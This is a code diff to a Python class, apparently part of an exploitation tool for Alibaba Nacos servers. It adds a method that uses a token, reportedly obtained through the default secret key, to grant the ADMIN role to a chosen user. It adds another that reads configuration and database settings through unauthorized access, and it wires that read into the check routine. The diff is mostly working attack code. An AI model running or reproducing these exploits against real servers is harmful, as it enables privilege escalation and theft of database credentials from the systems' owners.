@@ -504,6 +504,50 @@ class nacos:
                  return "[!] 获取Nacos版本信息失败, 可尝试手动通过未授权查看用户信息！"  
         except requests.exceptions.RequestException as e:
             return f"[!] 发生错误了:{str(e)}"  
+        
+    
+    def nacos_admin_group(self, username):
+        try:
+            token = self.get_nacos_token()                  
+            if self.target.endswith("/"):
+                path = f"nacos/v1/auth/roles?accessToken={token}"
+            else:
+                path = f"/nacos/v1/auth/roles?accessToken={token}"
+            
+            data = {
+                "role": "ADMIN",
+                "username": username
+            }
+                
+            url = f"{self.target}{path}" 
+            self.headers["Referer"] = f"{self.target}/nacos" 
+            self.headers["Accept"] = "application/json, text/plain, */*"
+            res = requests.post(url=url, headers=self.headers, verify=self.verify, data=data)
+            if res.status_code == 200 and "add role ok" in res.text:
+                return f"[+] 通过默认秘钥添加ADMIN用户组成功\n[+] {res.text}"
+            else:
+                return f"[-] {res.text}" 
+             
+        except requests.exceptions.RequestException as e:
+            return f"[!] 发生错误了:{str(e)}"
+
+    def nacos_database_config(self):
+        try:
+            token = self.get_nacos_token()                  
+            if self.target.endswith("/"):
+                path = f"nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant=namespace-zkky-xt&search=accurate&message=true&accessToken={token}&username="
+            else:
+                path = f"/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant=namespace-zkky-xt&search=accurate&message=true&accessToken={token}&username="
+            url = f"{self.target}{path}" 
+            self.headers["accessToken"] = token
+            res = requests.get(url=url, headers=self.headers, verify=self.verify)
+            if res.status_code == 200 and "pageItems" in res.text:
+                return f"[+] 越权查看数据库配置信息:\n[+] {res.text}"
+            else:
+                return f"[-] {res.text}" 
+             
+        except requests.exceptions.RequestException as e:
+            return f"[!] 发生错误了:{str(e)}"
 
     def check(self):
         result = []
@@ -527,6 +571,9 @@ class nacos:
         result.append(rs5)
         rs6 = self.nacos_sql()
         result.append(rs6)
+
+        rs10 = self.nacos_database_config()
+        print(rs10)
 
         return result
 
